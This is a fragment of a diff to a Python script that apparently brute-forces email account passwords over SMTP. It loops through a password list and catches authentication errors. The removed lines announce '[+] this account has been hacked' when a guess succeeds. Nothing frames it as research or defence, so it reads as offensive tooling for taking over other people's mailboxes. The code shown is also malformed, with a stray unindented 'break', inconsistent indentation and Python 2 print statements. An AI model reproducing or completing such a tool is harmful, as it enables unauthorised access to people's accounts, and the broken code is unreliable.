@@ -115,18 +115,7 @@ def trial_with_ssl(mail_user, mail_pass):
     
     print(passlines[index_of_pass])
 
-break
-   except smtplib.SMTPAuthenticationError as e:
-         error = str(e)
-         if error[14] == '<':
-            system('clear')
-            main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
 
-            break
-         else:
-            print '[!] password not found => ' + password
-login()     
 # ----------------------------------------------------------------------------------- #
 #                                 MAIN FUNCTION                                       #
 # ----------------------------------------------------------------------------------- #
